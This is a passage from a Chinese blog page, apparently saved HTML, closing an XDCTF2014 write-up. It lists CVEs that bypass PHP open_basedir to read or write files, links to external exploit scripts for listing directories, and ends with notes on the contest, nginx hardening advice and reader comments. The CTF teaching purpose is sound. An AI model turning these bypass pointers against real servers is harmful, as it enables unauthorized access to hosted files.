+	绕过<span>open_basedir</span><span>的</span><span>CVE</span><span>也有很多：</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	写文件：<span>CVE-2012-1171(libxml)</span>
+</p>
+<p class="p0">
+	 		          CVE-2012-3365(SQLite)
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	读文件：<span>CVE-2012-1171</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	列目录：<a href="http://ahack.ru/releases/glob_wrapper_open_basedir_exploit.php.txt" target="_blank">http://ahack.ru/releases/glob_wrapper_open_basedir_exploit.php.txt</a>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	当然，之前<span>parsec</span><span>团队的</span><span>/fd</span><span>曾经在</span><span>zone</span><span>里发过一个利用脚本：</span><a href="http://zone.wooyun.org/content/11268" target="_blank">http://zone.wooyun.org/content/11268</a> 。这里可以直接上。
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	列出目录<span>/home/wwwroot/ph/</span><span>，目录下的一个</span><span>flag-</span><span>开头的文件名，即为第三个</span><span>flag</span><span>。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	所以，不能盲目信任<span>php</span><span>的</span><span>open_basedir</span><span>，如果要配置好虚拟主机环境，可以参考我之前的一篇文章：</span><a href="https://www.leavesongs.com/PENETRATION/nginx-safe-dir.html" target="_blank">https://www.leavesongs.com/PENETRATION/nginx-safe-dir.html</a>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<span style="text-indent:21pt;line-height:1.5;"> </span>
+</p>
+<p class="p0">
+<strong>一些感想</strong>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	这次比赛所有的<span>nginx</span><span>环境都是严格按照上文中方法搭建（当然不包括</span><span>WEB270</span><span>那个可被绕过的），杜绝了跨目录等影响，不同的题目放在不同虚拟主机下运行，互不干扰，保证了初赛环境的安全。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	本次比赛交流思路<span>的现象依旧存在，比如</span><span>web270[3]</span><span>，之前说了，题目出来以后很长时间内没有人提交</span><span>flag</span><span>，但当第一个人提交了</span><span>flag</span><span>以后人数很快就上去了。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	当然我在很多群中也发现有<span>讨论题目详情的现象，此为</span><span>CTF</span><span>常态，我就不多说了。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	我个人很少参加<span>ctf</span><span>比赛，不像</span><span>L</span><span>团队中其他同学，所以出的题目如果有些不好的地方，也希望各位能够海涵。此次题目重点在逆向和溢出，也是历年</span><span>XDCTF</span><span>最后拿分的类别，也希望各位能更加关注这两类题目。</span>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	决赛的环境会比预赛丰富精彩，敬请期待。
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+	当然，感谢西电的其他几位主办方同学，特别是<span>rabit2013</span><span>同学，出题</span><span>+</span><span>审题是最辛苦的。这些活本该是我和</span><span>XDSEC</span><span>一些成员一起做的，但因为诸多原因打了个小酱油，包括之前去</span><span>ISC</span><span>耽误了很多事情，深表抱歉！</span>
+</p>
+<p>
+<br/>
+</p>
+<p class="p0" style="text-indent:21.0000pt;">
+<span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span>
+</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-1952">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./XDCTF2014 部分Writeup  离别歌/7cef7bd6af503a3e82747d464d9362f1.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">该昵称已屏蔽</a>
+<time datetime="2015年3月5日 17:31" itemprop="datePublished">
+                            2015 三月 05 17:31
+                        </time>
+<a href="javascript:reply_to('1952', '该昵称已屏蔽')">回复</a>
+</p>
+<p class="comment-meta">真的很不错   为博主点赞  为同行点赞</p>
+</div>
+</div>
+<div class="row" id="comment-1795">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./XDCTF2014 部分Writeup  离别歌/c8e1e5dfbddb46fad203b16f5dcdfa62.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://blog.ideafactory.pw" target="_blank">Mr.lonely</a>
+<time datetime="2014年10月10日 00:38" itemprop="datePublished">
+                            2014 十月 10 00:38
+                        </time>
+<a href="javascript:reply_to('1795', 'Mr.lonely')">回复</a>
+</p>
+<p class="comment-meta">知道今天我才看到了这个writeup......是不是太弱了.....<br/>还有一句话------"弹你一个脑瓜蹦"!</p>
+</div>
+</div>
+<div class="row" id="comment-1789">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./XDCTF2014 部分Writeup  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">小飞</a>
+<time datetime="2014年10月7日 10:55" itemprop="datePublished">
+                            2014 十月 07 10:55
+                        </time>
+<a href="javascript:reply_to('1789', '小飞')">回复</a>
+</p>
+<p class="comment-meta">还是说个小问题<br/>由于你暴露你出题人的身份- -<br/>别人回忆所有你接触过的东西<br/>举个例子<br/>svg那个prompt.pl有此题<br/>fd牛的open_basedir<br/>所以嘛，出题可不能暴露身份/*论m锅，p牛带我飞xdctf*/</p>
+</div>
+</div>
+<div class="row" id="comment-1788">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./XDCTF2014 部分Writeup  离别歌/1d72b8c00b874cd585f14c5d7ac12da5.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://fuck.0day5.com" target="_blank">saline</a>
+<time datetime="2014年10月6日 15:20" itemprop="datePublished">
+                            2014 十月 06 15:20
+                        </time>
+<a href="javascript:reply_to('1788', 'saline')">回复</a>
+</p>
+<p class="comment-meta">你始终不敢正视我的问题，<br/>学挖掘机到底哪家强？</p>
+</div>
+</div>
+<div class="row" id="comment-1787">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./XDCTF2014 部分Writeup  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">酱油甲</a>
+<time datetime="2014年10月6日 09:51" itemprop="datePublished">
+                            2014 十月 06 09:51
+                        </time>
+<a href="javascript:reply_to('1787', '酱油甲')">回复</a>
+</p>
+<p class="comment-meta">唉，还是和大神差距比较大啊==看来自己不是搞信安的料</p>
+</div>
+</div>
+<div class="row" id="comment-1785">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./XDCTF2014 部分Writeup  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">e0fic</a>
+<time datetime="2014年10月5日 21:40" itemprop="datePublished">
+                            2014 十月 05 21:40
+                        </time>
+<a href="javascript:reply_to('1785', 'e0fic')">回复</a>
+</p>
+<p class="comment-meta">求WEB180的writeup</p>
+</div>
+</div>
+<div class="row" id="comment-1784">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./XDCTF2014 部分Writeup  离别歌/b3c82cead78f48461085ab77b6cddb96.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://x0day.me" target="_blank">DM_</a>
+<time datetime="2014年10月5日 15:40" itemprop="datePublished">
+                            2014 十月 05 15:40
+                        </time>
+<a href="javascript:reply_to('1784', 'DM_')">回复</a>
+</p>
+<p class="comment-meta">你始终不敢正视我的问题，<br/>学挖掘机到底哪家强？</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="cd398ce9be3265c4bcfce10bf11b4a382b590253"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./XDCTF2014 部分Writeup  离别歌/cd398ce9be3265c4bcfce10bf11b4a382b590253"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="328">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="ynPyNHBuFrR9MQ5iZwrcPUdtiCkPpW3T6Ha4BbNJ6eLyMvtxNNVWoyfyrGNX8qS3"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./XDCTF2014 部分Writeup  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./XDCTF2014 部分Writeup  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
